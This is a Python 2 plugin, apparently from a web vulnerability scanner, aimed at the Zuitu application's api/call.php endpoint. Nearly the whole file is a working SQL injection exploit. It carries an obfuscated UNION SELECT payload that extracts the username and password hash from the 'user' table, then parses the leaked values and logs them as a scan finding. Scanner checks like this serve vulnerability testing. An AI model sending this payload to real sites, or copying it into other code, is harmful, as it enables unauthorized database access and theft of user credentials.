#!/usr/bin/python
# -*- coding: utf-8 -*-
from lib.common import *
import re
def run_domain(http,ob):
    try:  
        result=[]                               
        
        domain=ob['domain']
        url="api/call.php?action=query&num=j8g'%29/**/union/**/select/**/1,2,3,concat(0x7e,0x27,username,0x7e,0x4E56535F544553547E,password),5,6,7,8,9,10,11,12,13,14,15,16/**/from/**/user/**/limit/**/0,1%23"
        geturl="%s://%s%s%s"%(ob['scheme'],domain,ob['base_path'],url)
        response,content=requestUrl(http,geturl,ob['task_id'],ob['domain_id'])
        if content.find("NVS_TEST")>=0:
            m = re.search(r"<id>.{1,100}</id>", content)
            if m:
                mvalue=m.group(0)
                mvalue=mvalue.replace("<id>","")
                mvalue=mvalue.replace("</id>","")
                mvalue=mvalue.replace("~'","")
                mvaluelist=mvalue.split("~NVS_TEST~")
                detail='测试结果:\n用户名：%s\n密码(已加密)：%s'%(mvaluelist[0],mvaluelist[1])
#                detail = detail.decode('g').encode('utf8')
                
            request = getRequest(geturl)
            response = getResponse(response)
            result.append(getRecord(ob,ob['scheme']+"://"+domain,ob['level'],detail,request,response))
    except Exception, e:
        logging.getLogger().error("File:zuituisqlinjecitonscript.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:zuituisqlinjecitonscript.py, run_domain function :" + str(e))
    return result

